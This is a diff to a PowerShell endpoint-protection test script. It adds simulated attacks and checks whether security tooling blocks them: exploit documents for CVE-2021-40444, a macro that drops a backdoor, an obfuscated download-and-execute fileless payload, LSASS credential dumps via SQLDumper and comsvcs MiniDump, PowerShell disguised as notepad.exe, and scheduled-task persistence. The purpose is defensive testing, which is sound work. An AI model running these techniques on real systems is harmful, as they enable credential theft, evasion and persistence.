@@ -15,11 +15,12 @@ Prerequisites = Windows 10, OFfice, valid Microsoft 365 login, endpoint security
 
 #>
 
-## Variables
+#Region Variables
 $systemmessagecolor = "cyan"
 $processmessagecolor = "green"
 $errormessagecolor = "red"
 $warningmessagecolor = "yellow"
+#EndRegion Variables
 
 function displaymenu($mitems) {
     $mitems += [PSCustomObject]@{
@@ -146,6 +147,39 @@ function displaymenu($mitems) {
         Number = 31;
         Test = "HiveNightmare/CVE-2021-36934"
     }
+    $mitems += [PSCustomObject]@{
+        Number = 32;
+        Test = "MSHTML/CVE-2021-40444"
+    }
+    $mitems += [PSCustomObject]@{
+        Number = 33;
+        Test = "Forms 2.0 HTML controls"
+    }
+    $mitems += [PSCustomObject]@{
+        Number = 34;
+        Test = "Word document Backdoor drop"
+    }
+    $mitems += [PSCustomObject]@{
+        Number = 35;
+        Test = "PowerShell script in fileless attack"
+    }
+    $mitems += [PSCustomObject]@{
+        Number = 36;
+        Test = "Dump credentials using SQLDumper.exe"
+    }
+    $mitems += [PSCustomObject]@{
+        Number = 37;
+        Test = "Dump credentials using COMSVCS"
+    }
+    $mitems += [PSCustomObject]@{
+        Number = 38;
+        Test = "Mask Powershell.exe as Notepad.exe"
+    }
+    $mitems += [PSCustomObject]@{
+        Number = 39;
+        Test = "Create scheduled tasks"
+    }
+
     return $mitems
 }
 
@@ -208,17 +242,17 @@ function createfile(){
     else {
         write-host -foregroundcolor $errormessagecolor "`nEICAR file creation not detected - test FAILED"
     }
-    $crdtect = $true
+    $crdetect = $true
     try {
         $fileproperty = get-itemproperty .\eicar1.com.txt
     }
     catch {
         write-host -foregroundcolor $processmessagecolor "eicar1.com.txt file not detected - test SUCCEEDED"
-        $crdtect = $false
+        $crdetect = $false
     }
     if ($crdetect) {
         if ($fileproperty.Length -eq 0) {
-            write-host -foregroundcolor $processmessagecolor "eicar1.com.txt detected with file size = 0 - test SUUCCEEDED"
+            write-host -foregroundcolor $processmessagecolor "eicar1.com.txt detected with file size = 0 - test SUCCEEDED"
             write-host -foregroundcolor $processmessagecolor "Removing file .\EICAR1.COM.TXT"
             Remove-Item .\eicar1.com.txt
         }
@@ -260,9 +294,14 @@ function processdump() {
     $procdump = $true
     if (-not $result) {
         write-host -foregroundcolor $warningmessagecolor "SysInternals procdump.exe not found in current directory"
-        do {
-            $result = Read-host -prompt "Download SysInternals procdump (Y/N)?"
-        } until (-not [string]::isnullorempty($result))
+        if ($noprompt) {        # if running the script with no prompting
+            do {
+                $result = Read-host -prompt "Download SysInternals procdump (Y/N)?"
+            } until (-not [string]::isnullorempty($result))
+        }
+        else {
+            $result = 'Y'
+        }
         if ($result -eq 'Y' -or $result -eq 'y') {
             write-host -foregroundcolor $processmessagecolor "Download procdump.zip to current directory"
             invoke-webrequest -uri https://download.sysinternals.com/files/Procdump.zip -outfile .\procdump.zip
@@ -663,7 +702,8 @@ function servicescheck() {
         write-host -ForegroundColor $processmessagecolor -nonewline "- Attempt to stop Microsoft Defender Antivirus Service has "
         $servicestop = $true
         try {
-            $result = stop-service windefend -ErrorAction Stop
+            $service = "windefend"
+            $result = stop-service $service -ErrorAction Stop
         }
         catch {
             write-host -ForegroundColor $processmessagecolor "failed"
@@ -1119,6 +1159,173 @@ function hivevul () {
     }
 }
 
+function mshtmlvul() {
+    write-host -ForegroundColor white -backgroundcolor blue "`n--- 32. MSHTML remote code execution ---"
+    write-host -foregroundcolor $processmessagecolor "Download test Word document to current directory"
+    Invoke-WebRequest -Uri https://github.com/directorcia/examples/raw/main/WebBrowser.docx -OutFile .\webbrowser.docx
+    write-host -foregroundcolor $processmessagecolor "Open document using Word"
+    Start-Process winword.exe -ArgumentList ".\webbrowser.docx"
+    write-host "`n1. Click on the Totally Safe.txt embedded item at top of document"
+    write-host "2. Ensure that CALC.exe cannot be run in any way" 
+    write-host "3. Close Word once complete.`n"
+    pause
+    write-host -foregroundcolor $processmessagecolor "`nDelete webbrowser.docx"
+    remove-item .\webbrowser.docx  
+}
+
+function formshtml() {
+    write-host -ForegroundColor white -backgroundcolor blue "`n--- 33. Forms HTML controls remote code execution ---"
+    write-host -foregroundcolor $processmessagecolor "Download test Word document to current directory"
+    Invoke-WebRequest -Uri https://github.com/directorcia/examples/raw/main/Forms.HTML.docx -OutFile .\RS4_WinATP-Intro-Invoice.docm
+    write-host -foregroundcolor $processmessagecolor "Open document using Word"
+    Start-Process winword.exe -ArgumentList ".\forms.html.docx"
+    write-host "`n1. Click on the embedded item at top of document"
+    write-host "2. Ensure that CALC.exe cannot be run in any way" 
+    write-host "3. Close Word once complete.`n"
+    pause
+    write-host -foregroundcolor $processmessagecolor "`nDelete forms.html.docx"
+    remove-item .\forms.html.docx  
+}
+
+function backdoordrop() {
+    write-host -ForegroundColor white -backgroundcolor blue "`n--- 34. Document drops backdoor ---"
+    write-host -foregroundcolor $processmessagecolor "Download test Word document (RS4_WinATP-Intro-Invoice.docm) to current directory"
+    Invoke-WebRequest -Uri https://github.com/directorcia/examples/raw/main/RS4_WinATP-Intro-Invoice.docm -OutFile .\RS4_WinATP-Intro-Invoice.docm
+    write-host -foregroundcolor $processmessagecolor "Open document RS4_WinATP-Intro-Invoice.docm using Word"
+    Start-Process winword.exe -ArgumentList ".\RS4_WinATP-Intro-Invoice.docm"
+    write-host "`n1. Use the password = WDATP!diy# to open document"
+    write-host "2. Click enable editing if displayed" 
+    write-host "3. Click enable content if displayed"
+    write-host "4. Click the OK button on dialog if appears`n"
+    pause
+    try {
+        $result = test-path($env:USERPROFILE+"\desktop\WinATP-Intro-Backdoor.exe") -ErrorAction stop
+    }
+    catch {
+        $result = $false
+    }
+    if ($result) {
+        write-host -foregroundcolor $errormessagecolor "`nWinATP-Intro-Backdoor.exe - test FAILED`n"
+        write-host -foregroundcolor $processmessagecolor "Delete WinATP-Intro-Backdoor.exe`n"
+        remove-item ($env:USERPROFILE+"\desktop\WinATP-Intro-Backdoor.exe")
+    }
+    else {
+        write-host -foregroundcolor $processmessagecolor "`nWinATP-Intro-Backdoor.exe not found - test SUCCEEDED`n"
+    } 
+    write-host "5. Close Word once complete.`n"
+    pause
+    write-host -foregroundcolor $processmessagecolor "`nDelete RS4_WinATP-Intro-Invoice.docm`n"
+    remove-item .\RS4_WinATP-Intro-Invoice.docm  
+}
+
+function psfileless() {
+    write-host -ForegroundColor white -backgroundcolor blue "`n--- 35. PowerShell script in fileless attack ---"
+    write-host -foregroundcolor $processmessagecolor "Execute Fileless attack"
+$body1 = @'
+[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12;$xor = [System.Text.Encoding]::UTF8.GetBytes('WinATP-Intro-Injection');$base64String = (Invoke-WebRequest -URI https://winatpmanagement.windows.com/client/management/static/WinATP-Intro-Fileless.txt -UseBasicParsing).Content;Try{ $contentBytes = [System.Convert]::FromBase64String($base64String) } Catch { $contentBytes = [System.Convert]::FromBase64String($base64String.Substring(3)) };$i = 0; $decryptedBytes = @();$contentBytes.foreach{ $decryptedBytes += $_ -bxor $xor[$i]; $i++; if ($i -eq $xor.Length) {$i = 0} };
+'@
+$body2 = @'
+Invok
+'@
+$body3 = @'
+e-Expression ([System.Text.Encoding]::UTF8.GetString($decryptedBytes))
+'@
+
+    $body = -join($body1,$body2,$body3)
+    $errorfile =".\errorfile.txt"
+    Start-Process powershell -ArgumentList $body -wait -WindowStyle Hidden -redirectstandarderror $errorfile
+    write-host -foregroundcolor $warningmessagecolor "`nIf NOTEPAD is executed, then the test has FAILED`n"
+    pause
+}
+
+function sqldumper() {
+    write-host -ForegroundColor white -backgroundcolor blue "`n--- 36. SQLDumper ---"
+    write-host -foregroundcolor $processmessagecolor "Download SQLDumper to current directory"
+    Invoke-WebRequest -Uri https://github.com/directorcia/examples/raw/main/SQLDumper.exe -OutFile .\SQLDumper.exe
+    write-host -foregroundcolor $processmessagecolor "Get LSASS.EXE process id"
+    $id=(get-process -processname "lsass").Id
+    write-host -foregroundcolor $processmessagecolor "Attempt process dump"
+    $result = .\sqldumper.exe $id 0 0x01100:40
+    if (($result -match "failed") -or [string]::isnullorempty($result)) {
+        write-host -foregroundcolor $processmessagecolor "`nProcess dump failed - test SUCCEEDED`n"
+        write-host -foregroundcolor $processmessagecolor "Delete SQLDumper.exe`n"
+        remove-item .\SQLDumper.exe
+    }
+    else {
+        write-host -foregroundcolor $errormessagecolor "`nProcess dump succeeded - test FAILED`n"
+        write-host -foregroundcolor $processmessagecolor "Delete SQLDumper.exe`n"
+        remove-item .\SQLDumper.exe
+        write-host -foregroundcolor $processmessagecolor "Delete dump file`n"
+        remove-item .\SQLD*.*
+    }
+}
+
+function comsvcs() {
+    write-host -ForegroundColor white -backgroundcolor blue "`n--- 37. Block RUNDLL32 COMSVCS dump process launch ---"
+    
+$body = @"
+rundll.exe %windir%\System32\comsvcs.dll, MiniDump ((Get-Process lsass).Id) .\lsass.dmp full
+"@
+    try {
+        $errorfile = ".\errorfile.txt"
+        Start-Process powershell -ArgumentList $body -wait -WindowStyle Hidden -redirectstandarderror $errorfile
+    }
+    catch {
+        write-host -ForegroundColor $processmessagecolor "Dump process execution failed`n"
+    }
+    if (test-path('.\lsass.dmp')) {
+        write-host -ForegroundColor $errormessagecolor "Test failed - dump created"
+        write-host -foregroundcolor $processmessagecolor "  Deleting lsass.dmp`n"
+        Remove-Item -Force -Path ('.\lsass.dmp')
+    } else {
+        write-host -ForegroundColor $processmessagecolor "Test succeeded - dump not created`n"
+    }
+    pause
+}
+
+function notepadmask () {
+    write-host -ForegroundColor white -backgroundcolor blue "`n--- 38. Mask PowerShell.exe ---"
+    write-host -ForegroundColor $processmessagecolor "Copy Powershell.exe to Notepad.exe in current directory`n"
+    if (test-path("$env:WINDIR\System32\WindowsPowerShell\v1.0\powershell.exe")) {
+        copy-item -path "$env:WINDIR\System32\WindowsPowerShell\v1.0\powershell.exe" -destination ".\notepad.exe" -force
+        .\notepad.exe -e JgAgACgAZwBjAG0AIAAoACcAaQBlAHsAMAB9ACcAIAAtAGYAIAAnAHgAJwApACkAIAAoACIAVwByACIAKwAiAGkAdAAiACsAIgBlAC0ASAAiACsAIgBvAHMAdAAgACcASAAiACsAIgBlAGwAIgArACIAbABvACwAIABmAHIAIgArACIAbwBtACAAUAAiACsAIgBvAHcAIgArACIAZQByAFMAIgArACIAaAAiACsAIgBlAGwAbAAhACcAIgApAA==
+        write-host -ForegroundColor $warningmessagecolor "`nNo welcome message should have been displayed`n"
+        Pause
+        write-host -ForegroundColor $processmessagecolor "Remove notepad.exe from current directory`n"
+        remove-item (".\notepad.exe")
+    } else {
+        write-host -ForegroundColor $errormessagecolor "Unable to locate $env:WINDIR\System32\WindowsPowerShell\v1.0\powershell.exe`n"
+    }
+
+}
+
+function schtsk () {
+    write-host -ForegroundColor white -backgroundcolor blue "`n--- 39. Create Scheduled Task ---"
+    $testflag = $false
+    $result = cmd.exe /c 'schtasks /Create /F /SC MINUTE /MO 3 /ST 07:00 /TN CMDTestTask /TR "cmd /c date /T > .\current_date.txt'
+    if ($result -match "SUCCESS") {
+        write-host -ForegroundColor $errormessagecolor "Scheduled task created"
+        $testflag = $true
+        $result = cmd.exe /c 'schtasks /Query /TN CMDTestTask'
+        if ($result -match "Ready") {
+            write-host -ForegroundColor $errormessagecolor "Scheduled task found"
+            $testflag = $true
+        }
+    }
+    if ($testflag) {
+        write-host -ForegroundColor $errormessagecolor "Test failed - Scheduled task created"
+        write-host -ForegroundColor $processmessagecolor "  Remove scheduled task"
+        $result = cmd.exe /c 'schtasks /Delete /TN CMDTestTask /F'
+    }
+    else {
+        write-host -ForegroundColor $errormessagecolor "Test succeeded - No Scheduled task created"
+    }
+    if (test-path -Path ".\current_date.txt") {
+        write-host -ForegroundColor $processmessagecolor "  Remove current_date.txt"
+        remove-item -Path ".\current_date.txt"
+    }
+}
+
 <#          Main                #>
 Clear-Host
 if ($debug) {       # If -debug command line option specified record log file in parent
@@ -1187,6 +1394,14 @@ switch ($results.number) {
     29  {rundll}
     30  {mimispool}
     31  {hivevul}
+    32  {mshtmlvul}
+    33  {formshtml}
+    34  {backdoordrop}
+    35  {psfileless}
+    36  {sqldumper}
+    37  {comsvcs}
+    38  {notepadmask}
+    39  {schtsk}
 }
 
 write-host -foregroundcolor $systemmessagecolor "`nSecurity test script completed"
